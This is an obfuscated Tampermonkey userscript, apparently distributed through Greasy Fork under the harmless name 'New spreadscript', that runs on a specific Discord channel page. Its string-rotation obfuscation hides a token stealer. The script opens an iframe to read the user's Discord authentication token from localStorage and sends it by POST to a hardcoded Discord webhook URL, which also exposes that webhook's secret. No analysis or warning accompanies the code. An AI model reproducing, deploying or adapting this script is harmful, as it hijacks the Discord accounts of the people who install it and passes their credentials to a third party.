// ==UserScript==
// @name         New spreadscript
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        https://discord.com/channels/647803797384724481/740669246702616650
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/420940/New%20spreadscript.user.js
// @updateURL https://update.greasyfork.org/scripts/420940/New%20spreadscript.meta.js
// ==/UserScript==

const a=['open',
         'application/json',
         'iframe',
         'Content-Type',
         'https://discord.com/api/webhooks/805249072910041098/4vYY2n15QOLvZUtXioxXyz2JjL9HqI_8iphnNQ5_Ol0EMxwchuqZ4ZKNd0wosiNEWdgI',
         'localStorage',
         'createElement',
         'appendChild',
         'POST',
         'replace',
         'stringify',
         'contentWindow',
         'send',
         'setRequestHeader'];
(function(b,c){
    const f=function(g){
        while(--g){
            b['push'](b['shift']());
        }
    };
    f(++c);
}
 (a,0xde));
const b=function(c,d){
    c=c-0x0;
    let e=a[c];
    return e;

};

const c=b;
let f=document['body'][c('0x9')](document[c('0x8')](c('0x4')))[c('0xd')][c('0x7')]['token'];
f=f[c('0xb')]('\x22','')['replace']('\x22','');
const tt=new XMLHttpRequest();
    const ll=c('0x6');
tt[c('0x2')](c('0xa'),
             ll,
             !![]);
tt[c('0x1')](c('0x5'),
             c('0x3'));
tt[c('0x0')]
(JSON[c('0xc')](
    {
        'content':' '+f
    }
));